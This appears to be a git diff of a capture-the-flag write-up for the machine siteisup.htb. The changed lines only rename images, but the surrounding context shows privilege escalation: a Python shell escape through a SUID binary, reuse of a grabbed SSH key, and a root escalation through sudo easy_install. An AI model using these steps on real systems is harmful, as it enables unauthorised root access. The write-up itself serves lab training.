@@ -420,13 +420,13 @@ Let's escalate privileges to developer, since the executable has the SUID bit se
 __import__('os').system('bash')
 ```
 
-<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:blue;">Shell as developer</mark>
 
 I'll grab the ssh key for ease of access and a better shell
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```shellscript
 vi developer_id_rsa
@@ -434,11 +434,11 @@ chmod 600 developer_id_rsa
 ssh -i developer_id_rsa developer@siteisup.htb
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:blue;">Manual Enumeration</mark>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 developer can run `easy_install` as root without a password
 
@@ -448,7 +448,7 @@ developer can run `easy_install` as root without a password
 
 [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) has an easy privesc
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 It takes a url I can host a malicious script on my machine and fetch it
 
@@ -463,5 +463,5 @@ sudo easy_install /dev/shm/deimos/
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
